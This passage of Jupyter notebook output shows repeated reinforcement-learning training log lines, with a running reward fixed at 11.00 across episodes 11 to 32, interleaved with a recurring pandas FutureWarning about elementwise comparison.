      "Running reward: 11.00\t Episode 11\t Frame count: 12100\t Context: 2\n",
      "Running reward: 11.00\t Episode 11\t Frame count: 12200\t Context: 2\n",
      "Running reward: 11.00\t Episode 11\t Frame count: 12300\t Context: 2\n",
      "Running reward: 11.00\t Episode 12\t Frame count: 12400\t Context: 1\n",
      "Running reward: 11.00\t Episode 12\t Frame count: 12500\t Context: 1\n",
      "Running reward: 11.00\t Episode 12\t Frame count: 12600\t Context: 1\n",
      "Running reward: 11.00\t Episode 12\t Frame count: 12700\t Context: 1\n",
      "Running reward: 11.00\t Episode 12\t Frame count: 12800\t Context: 1\n",
      "Running reward: 11.00\t Episode 12\t Frame count: 12900\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 13000\t Context: 1\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 13100\t Context: 1\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 13200\t Context: 1\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 13300\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 13400\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 13500\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 13600\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 13700\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 13800\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 13900\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 14000\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 14100\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 14200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 13\t Frame count: 14300\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 14400\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 14500\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 14600\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 14700\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 14800\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 14900\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 15000\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 15100\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 15200\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 15300\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 15400\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 15500\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 15600\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 15700\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 15800\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 15900\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 16000\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 16100\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 16200\t Context: 2\n",
      "Running reward: 11.00\t Episode 13\t Frame count: 16300\t Context: 2\n",
      "Running reward: 11.00\t Episode 14\t Frame count: 16400\t Context: 2\n",
      "Running reward: 11.00\t Episode 14\t Frame count: 16500\t Context: 2\n",
      "Running reward: 11.00\t Episode 14\t Frame count: 16600\t Context: 2\n",
      "Running reward: 11.00\t Episode 15\t Frame count: 16700\t Context: 1\n",
      "Running reward: 11.00\t Episode 15\t Frame count: 16800\t Context: 1\n",
      "Running reward: 11.00\t Episode 15\t Frame count: 16900\t Context: 2\n",
      "Running reward: 11.00\t Episode 15\t Frame count: 17000\t Context: 2\n",
      "Running reward: 11.00\t Episode 15\t Frame count: 17100\t Context: 2\n",
      "Running reward: 11.00\t Episode 15\t Frame count: 17200\t Context: 2\n",
      "Running reward: 11.00\t Episode 15\t Frame count: 17300\t Context: 2\n",
      "Running reward: 11.00\t Episode 15\t Frame count: 17400\t Context: 2\n",
      "Running reward: 11.00\t Episode 15\t Frame count: 17500\t Context: 2\n",
      "Running reward: 11.00\t Episode 15\t Frame count: 17600\t Context: 2\n",
      "Running reward: 11.00\t Episode 15\t Frame count: 17700\t Context: 2\n",
      "Running reward: 11.00\t Episode 15\t Frame count: 17800\t Context: 2\n",
      "Running reward: 11.00\t Episode 15\t Frame count: 17900\t Context: 2\n",
      "Running reward: 11.00\t Episode 15\t Frame count: 18000\t Context: 2\n",
      "Running reward: 11.00\t Episode 15\t Frame count: 18100\t Context: 2\n",
      "Running reward: 11.00\t Episode 16\t Frame count: 18200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 16\t Frame count: 18300\t Context: 2\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 18400\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 18500\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 18600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 17\t Frame count: 18700\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 18800\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 18900\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 19000\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 19100\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 19200\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 19300\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 19400\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 19500\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 19600\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 19700\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 19800\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 19900\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 20000\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 20100\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 20200\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 20300\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 20400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 17\t Frame count: 20500\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 20600\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 20700\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 20800\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 20900\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 21000\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 21100\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 21200\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 21300\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 21400\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 21500\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 21600\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 21700\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 21800\t Context: 1\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 21900\t Context: 2\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 22000\t Context: 2\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 22100\t Context: 2\n",
      "Running reward: 11.00\t Episode 17\t Frame count: 22200\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 22300\t Context: 1\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 22400\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 22500\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 22600\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 22700\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 22800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 18\t Frame count: 22900\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 23000\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 23100\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 23200\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 23300\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 23400\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 23500\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 23600\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 23700\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 23800\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 23900\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 24000\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 24100\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 24200\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 24300\t Context: 2\n",
      "Running reward: 11.00\t Episode 18\t Frame count: 24400\t Context: 2\n",
      "Running reward: 11.00\t Episode 19\t Frame count: 24500\t Context: 1\n",
      "Running reward: 11.00\t Episode 19\t Frame count: 24600\t Context: 1\n",
      "Running reward: 11.00\t Episode 19\t Frame count: 24700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 19\t Frame count: 24800\t Context: 1\n",
      "Running reward: 11.00\t Episode 19\t Frame count: 24900\t Context: 2\n",
      "Running reward: 11.00\t Episode 19\t Frame count: 25000\t Context: 2\n",
      "Running reward: 11.00\t Episode 19\t Frame count: 25100\t Context: 2\n",
      "Running reward: 11.00\t Episode 19\t Frame count: 25200\t Context: 2\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 25300\t Context: 1\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 25400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 20\t Frame count: 25500\t Context: 1\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 25600\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 20\t Frame count: 25700\t Context: 1\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 25800\t Context: 1\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 25900\t Context: 1\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 26000\t Context: 1\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 26100\t Context: 1\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 26200\t Context: 1\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 26300\t Context: 2\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 26400\t Context: 2\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 26500\t Context: 2\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 26600\t Context: 2\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 26700\t Context: 2\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 26800\t Context: 2\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 26900\t Context: 2\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 27000\t Context: 2\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 27100\t Context: 2\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 27200\t Context: 2\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 27300\t Context: 2\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 27400\t Context: 2\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 27500\t Context: 2\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 27600\t Context: 2\n",
      "Running reward: 11.00\t Episode 20\t Frame count: 27700\t Context: 2\n",
      "Running reward: 11.00\t Episode 21\t Frame count: 27800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 21\t Frame count: 27900\t Context: 1\n",
      "Running reward: 11.00\t Episode 21\t Frame count: 28000\t Context: 2\n",
      "Running reward: 11.00\t Episode 21\t Frame count: 28100\t Context: 2\n",
      "Running reward: 11.00\t Episode 22\t Frame count: 28200\t Context: 2\n",
      "Running reward: 11.00\t Episode 22\t Frame count: 28300\t Context: 2\n",
      "Running reward: 11.00\t Episode 22\t Frame count: 28400\t Context: 2\n",
      "Running reward: 11.00\t Episode 22\t Frame count: 28500\t Context: 2\n",
      "Running reward: 11.00\t Episode 22\t Frame count: 28600\t Context: 2\n",
      "Running reward: 11.00\t Episode 22\t Frame count: 28700\t Context: 2\n",
      "Running reward: 11.00\t Episode 22\t Frame count: 28800\t Context: 2\n",
      "Running reward: 11.00\t Episode 22\t Frame count: 28900\t Context: 2\n",
      "Running reward: 11.00\t Episode 22\t Frame count: 29000\t Context: 2\n",
      "Running reward: 11.00\t Episode 22\t Frame count: 29100\t Context: 2\n",
      "Running reward: 11.00\t Episode 23\t Frame count: 29200\t Context: 1\n",
      "Running reward: 11.00\t Episode 23\t Frame count: 29300\t Context: 1\n",
      "Running reward: 11.00\t Episode 23\t Frame count: 29400\t Context: 1\n",
      "Running reward: 11.00\t Episode 23\t Frame count: 29500\t Context: 1\n",
      "Running reward: 11.00\t Episode 23\t Frame count: 29600\t Context: 1\n",
      "Running reward: 11.00\t Episode 23\t Frame count: 29700\t Context: 2\n",
      "Running reward: 11.00\t Episode 23\t Frame count: 29800\t Context: 2\n",
      "Running reward: 11.00\t Episode 23\t Frame count: 29900\t Context: 2\n",
      "Running reward: 11.00\t Episode 24\t Frame count: 30000\t Context: 1\n",
      "Running reward: 11.00\t Episode 24\t Frame count: 30100\t Context: 1\n",
      "Running reward: 11.00\t Episode 24\t Frame count: 30200\t Context: 1\n",
      "Running reward: 11.00\t Episode 24\t Frame count: 30300\t Context: 2\n",
      "Running reward: 11.00\t Episode 24\t Frame count: 30400\t Context: 2\n",
      "Running reward: 11.00\t Episode 24\t Frame count: 30500\t Context: 2\n",
      "Running reward: 11.00\t Episode 24\t Frame count: 30600\t Context: 2\n",
      "Running reward: 11.00\t Episode 25\t Frame count: 30700\t Context: 1\n",
      "Running reward: 11.00\t Episode 25\t Frame count: 30800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 25\t Frame count: 30900\t Context: 1\n",
      "Running reward: 11.00\t Episode 25\t Frame count: 31000\t Context: 2\n",
      "Running reward: 11.00\t Episode 25\t Frame count: 31100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 26\t Frame count: 31200\t Context: 1\n",
      "Running reward: 11.00\t Episode 26\t Frame count: 31300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 27\t Frame count: 31400\t Context: 1\n",
      "Running reward: 11.00\t Episode 27\t Frame count: 31500\t Context: 1\n",
      "Running reward: 11.00\t Episode 27\t Frame count: 31600\t Context: 1\n",
      "Running reward: 11.00\t Episode 27\t Frame count: 31700\t Context: 2\n",
      "Running reward: 11.00\t Episode 27\t Frame count: 31800\t Context: 2\n",
      "Running reward: 11.00\t Episode 27\t Frame count: 31900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 27\t Frame count: 32000\t Context: 2\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 32100\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 32200\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 32300\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 32400\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 32500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 28\t Frame count: 32600\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 32700\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 32800\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 32900\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 33000\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 33100\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 33200\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 33300\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 33400\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 33500\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 33600\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 33700\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 33800\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 33900\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 34000\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 34100\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 34200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 28\t Frame count: 34300\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 34400\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 34500\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 34600\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 34700\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 34800\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 34900\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 35000\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 35100\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 35200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 28\t Frame count: 35300\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 35400\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 35500\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 35600\t Context: 1\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 35700\t Context: 2\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 35800\t Context: 2\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 35900\t Context: 2\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 36000\t Context: 2\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 36100\t Context: 2\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 36200\t Context: 2\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 36300\t Context: 2\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 36400\t Context: 2\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 36500\t Context: 2\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 36600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 28\t Frame count: 36700\t Context: 2\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 36800\t Context: 2\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 36900\t Context: 2\n",
      "Running reward: 11.00\t Episode 28\t Frame count: 37000\t Context: 2\n",
      "Running reward: 11.00\t Episode 29\t Frame count: 37100\t Context: 1\n",
      "Running reward: 11.00\t Episode 29\t Frame count: 37200\t Context: 1\n",
      "Running reward: 11.00\t Episode 29\t Frame count: 37300\t Context: 1\n",
      "Running reward: 11.00\t Episode 29\t Frame count: 37400\t Context: 1\n",
      "Running reward: 11.00\t Episode 29\t Frame count: 37500\t Context: 1\n",
      "Running reward: 11.00\t Episode 29\t Frame count: 37600\t Context: 1\n",
      "Running reward: 11.00\t Episode 29\t Frame count: 37700\t Context: 1\n",
      "Running reward: 11.00\t Episode 29\t Frame count: 37800\t Context: 1\n",
      "Running reward: 11.00\t Episode 29\t Frame count: 37900\t Context: 2\n",
      "Running reward: 11.00\t Episode 30\t Frame count: 38000\t Context: 2\n",
      "Running reward: 11.00\t Episode 30\t Frame count: 38100\t Context: 2\n",
      "Running reward: 11.00\t Episode 30\t Frame count: 38200\t Context: 2\n",
      "Running reward: 11.00\t Episode 31\t Frame count: 38300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 31\t Frame count: 38400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 31\t Frame count: 38500\t Context: 1\n",
      "Running reward: 11.00\t Episode 31\t Frame count: 38600\t Context: 1\n",
      "Running reward: 11.00\t Episode 31\t Frame count: 38700\t Context: 1\n",
      "Running reward: 11.00\t Episode 31\t Frame count: 38800\t Context: 2\n",
      "Running reward: 11.00\t Episode 31\t Frame count: 38900\t Context: 2\n",
      "Running reward: 11.00\t Episode 31\t Frame count: 39000\t Context: 2\n",
      "Running reward: 11.00\t Episode 31\t Frame count: 39100\t Context: 2\n",
      "Running reward: 11.00\t Episode 31\t Frame count: 39200\t Context: 2\n",
      "Running reward: 11.00\t Episode 31\t Frame count: 39300\t Context: 2\n",
      "Running reward: 11.00\t Episode 31\t Frame count: 39400\t Context: 2\n",
      "Running reward: 11.00\t Episode 31\t Frame count: 39500\t Context: 2\n",
      "Running reward: 11.00\t Episode 31\t Frame count: 39600\t Context: 2\n",
      "Running reward: 11.00\t Episode 31\t Frame count: 39700\t Context: 2\n",
      "Running reward: 11.00\t Episode 31\t Frame count: 39800\t Context: 2\n",
      "Running reward: 11.00\t Episode 31\t Frame count: 39900\t Context: 2\n",
      "Running reward: 11.00\t Episode 32\t Frame count: 40000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_3848\\3223447213.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
